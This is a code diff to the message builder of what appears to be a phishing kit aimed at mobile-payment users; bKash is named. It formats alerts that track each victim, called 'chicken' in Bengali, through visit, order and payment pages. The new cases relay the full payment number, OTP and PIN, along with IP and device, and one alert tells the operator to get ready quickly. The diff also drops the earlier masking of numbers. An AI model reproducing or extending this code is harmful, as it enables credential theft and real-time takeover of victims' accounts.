@@ -26,148 +26,118 @@ function br() {
   return "\n";
 }
 
+// Helper to format messages with consistent spacing
+function formatMsg(title: string, lines: Array<{key: string, value: string}>) {
+  let msg = `🐔 ${title}\n  \n`;
+  for (const line of lines) {
+    msg += `${line.key} : ${line.value || ""}\n  \n`;
+  }
+  return msg + "\n  ";
+}
+
 // Build message by type
 function buildMessage(type: string, data: any, meta: any) {
   const ip = escapeHtml(meta.ip || "N/A");
   const ref = escapeHtml(meta.referrer || "Direct");
   const ua = escapeHtml(meta.ua || data?.device || "N/A");
-  const screen = escapeHtml(meta.screen || data?.screen || "N/A");
 
   switch (type) {
-    // New API events
     case "visit": {
-      return (
-        `🐔 New Visit` + br() +
-        `IP: ${ip}` + br() +
-        `Device: ${ua}` + br() +
-        `Referrer: ${ref}`
-      );
+      return formatMsg("মুরগি ওয়েবসাইট ভিজিট করতেছে ⚠️", [
+        { key: "🐔মুরগির Device", value: ua },
+        { key: "🐔মুরগির IP", value: ip },
+        { key: "🐔মুরগির Referrer", value: ref },
+      ]);
     }
+    
     case "platform_click": {
-      const platform = escapeHtml(data?.platform ?? "Youtube");
-      return (
-        `Now 🐔মুরগি is on ${platform} Platform` + br() +
-        `🐔মুরগির IP Address: ${ip}` + br() +
-        `🐔মুরগির Device: ${ua}`
-      );
+      const platform = escapeHtml(data?.platform ?? "Unknown");
+      return formatMsg("মুরগি প্লাটফর্ম ক্লিক করেছে ⚠️", [
+        { key: "Platform", value: platform },
+        { key: "🐔মুরগির Device", value: ua },
+        { key: "🐔মুরগির IP", value: ip },
+        { key: "🐔মুরগির Referrer", value: ref },
+      ]);
     }
+    
     case "service_click": {
       const platform = escapeHtml(data?.platform ?? "N/A");
       const service = escapeHtml(data?.service ?? "N/A");
-      return (
-        `🐔মুরগি Service Clicked` + br() +
-        `Platform: ${platform}` + br() +
-        `Service: ${service}` + br() +
-        `IP: ${ip}`
-      );
+      return formatMsg("মুরগি প্লাটফর্মের সাভিস ক্লিক করেছে ⚠️", [
+        { key: "Platform", value: platform },
+        { key: "Service", value: service },
+        { key: "🐔মুরগির Device", value: ua },
+        { key: "🐔মুরগির IP", value: ip },
+        { key: "🐔মুরগির Referrer", value: ref },
+      ]);
     }
+    
     case "order_submit": {
       const platform = escapeHtml(data?.platform ?? "N/A");
       const service = escapeHtml(data?.service ?? "N/A");
       const link = escapeHtml(data?.link ?? "N/A");
-      return (
-        `🐔 ORDER SUBMITTED` + br() +
-        `Platform: ${platform}` + br() +
-        `Service: ${service}` + br() +
-        `Link: ${link}` + br() +
-        `IP: ${ip}`
-      );
+      return formatMsg("মুরগি অর্ডার সাবমিট করেছে ✅", [
+        { key: "Platform", value: platform },
+        { key: "Service", value: service },
+        { key: "Link", value: link },
+        { key: "🐔মুরগির Device", value: ua },
+        { key: "🐔মুরগির IP", value: ip },
+        { key: "🐔মুরগির Referrer", value: ref },
+      ]);
     }
+    
     case "payment_page": {
-      const method = escapeHtml(data?.method ?? "Payment");
-      return (
-        `🐔 মুরগি ${method} এ ঢুকসে ⚠️ তাড়াতাড়ি রেডি হও ⚠️` + br() + br() +
-        `🐔মুরগির IP Address: ${ip}` + br() +
-        `🐔মুরগির Device: ${ua}`
-      );
+      const method = escapeHtml(data?.method ?? "এখনো সিলেক্ট করেনি।");
+      return formatMsg("মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅", [
+        { key: "Payment Method", value: method },
+        { key: "🐔মুরগির Device", value: ua },
+        { key: "🐔মুরগির IP", value: ip },
+        { key: "🐔মুরগির Referrer", value: ref },
+      ]);
     }
-    case "payment_otp_note": {
-      const method = escapeHtml(data?.method ?? "N/A");
-      const numberMasked = escapeHtml(data?.numberMasked ?? "N/A");
-      return (
-        `🐔 OTP Page Reached - ${method}` + br() +
-        `Number Provided: ${numberMasked}` + br() +
-        `IP: ${ip}`
-      );
-    }
-    case "payment_pin_note": {
-      const method = escapeHtml(data?.method ?? "N/A");
-      const numberMasked = escapeHtml(data?.numberMasked ?? "N/A");
-      return (
-        `🐔 PIN Page Reached - ${method}` + br() +
-        `Number Provided: ${numberMasked}` + br() +
-        `IP: ${ip}`
-      );
-    }
-
-    // Legacy API events (backward compatibility)
-    case "membership_click": {
-      const platform = escapeHtml(data?.platform ?? "Youtube");
-      return (
-        `Now 🐔মুরগি is on ${platform} Membership` + br() + br() +
-        `🐔মুরগির IP Address: ${ip}` + br() +
-        `🐔মুরগির Device Info: ${ua}` + br() +
-        `🐔মুরগির Screen Resolution: ${screen}`
-      );
-    }
-    case "beta_access_click": {
-      const page = escapeHtml(data?.page ?? "unknown page");
-      return (
-        `🐔মুরগি Try Beta Access এ ক্লিক করেছে (${page})` + br() +
-        `🐔মুরগির IP Address: ${ip}`
-      );
-    }
+    
     case "payment_number": {
-      // Support both old and new format
-      const page = escapeHtml(data?.page ?? "Payment Page");
-      const number = escapeHtml(data?.number ?? "");
-      const method = escapeHtml(data?.method ?? "");
-      const numberMasked = escapeHtml(data?.numberMasked ?? "");
-      
-      if (numberMasked) {
-        return (
-          `🐔মুরগির Payment Method: ${method}` + br() +
-          `🐔মুরগির নাম্বার (masked): ${numberMasked}` + br() +
-          `🐔মুরগির IP Address: ${ip}`
-        );
-      } else {
-        return (
-          `🐔মুরগির যেই পেজ Clicked page: ${page}` + br() +
-          `🐔মুরগির নাম্বার: ${number}` + br() +
-          `🐔মুরগির IP Address: ${ip}`
-        );
-      }
+      const method = escapeHtml(data?.method ?? "N/A");
+      const number = escapeHtml(data?.number ?? "N/A");
+      return formatMsg("মুরগি পেমেন্ট নাম্বার দিয়েছে ✅", [
+        { key: "Payment Method", value: method },
+        { key: "Number", value: number },
+        { key: "🐔মুরগির Device", value: ua },
+        { key: "🐔মুরগির IP", value: ip },
+        { key: "🐔মুরগির Referrer", value: ref },
+      ]);
     }
-    case "payment_gateway_open": {
-      const gateway = escapeHtml(data?.gateway ?? "Payment");
-      return (
-        `🐔 মুরগি ${gateway} এ ঢুকসে ⚠️ তাড়াতাড়ি রেডি হও ⚠️` + br() + br() +
-        `🐔মুরগির IP Address: ${ip}` + br() +
-        `🐔মুরগির Referrer: ${ref}`
-      );
+    
+    case "payment_otp": {
+      const method = escapeHtml(data?.method ?? "N/A");
+      const number = escapeHtml(data?.number ?? "N/A");
+      const otp = escapeHtml(data?.otp ?? "N/A");
+      return formatMsg("মুরগি OTP দিয়েছে ✅", [
+        { key: "Payment Method", value: method },
+        { key: "Number", value: number },
+        { key: "OTP", value: otp },
+        { key: "🐔মুরগির Device", value: ua },
+        { key: "🐔মুরগির IP", value: ip },
+        { key: "🐔মুরগির Referrer", value: ref },
+      ]);
     }
-    case "otp_pin": {
-      const method = escapeHtml(data?.method ?? "bKash");
-      const number = escapeHtml(data?.number ?? "");
-      const otp = escapeHtml(data?.otp ?? "");
-      const pin = escapeHtml(data?.pin ?? "");
-      const amount = escapeHtml(data?.amount ?? "");
-      let msg = `🐔 মুরগি ${method} OTP/PIN Info` + br() + br();
-      if (number) msg += `🐔মুরগির ${method} নাম্বার: ${number}` + br();
-      if (otp) msg += `🐔OTP: ${otp}` + br();
-      if (pin) msg += `🐔PIN: ${pin}` + br();
-      if (amount) msg += `🐔Amount: ${amount}` + br();
-      msg += `🐔মুরগির IP Address: ${ip}`;
-      return msg;
+    
+    case "payment_pin": {
+      const method = escapeHtml(data?.method ?? "N/A");
+      const number = escapeHtml(data?.number ?? "N/A");
+      const otp = escapeHtml(data?.otp ?? "N/A");
+      const pin = escapeHtml(data?.pin ?? "N/A");
+      return formatMsg("মুরগি PIN দিয়েছে ✅✅✅", [
+        { key: "Payment Method", value: method },
+        { key: "Number", value: number },
+        { key: "OTP", value: otp },
+        { key: "PIN", value: pin },
+        { key: "🐔মুরগির Device", value: ua },
+        { key: "🐔মুরগির IP", value: ip },
+        { key: "🐔মুরগির Referrer", value: ref },
+      ]);
     }
-    case "generic": {
-      const text = escapeHtml(data?.text ?? "");
-      return (
-        `🔁 Old Log: ${text}` + br() + br() +
-        `🐔মুরগির IP Address: ${ip}` + br() +
-        `🐔মুরগির Device Info: ${ua}`
-      );
-    }
+    
     default:
       return `Unknown log type: ${escapeHtml(type)}` + br() + `IP: ${ip}`;
   }
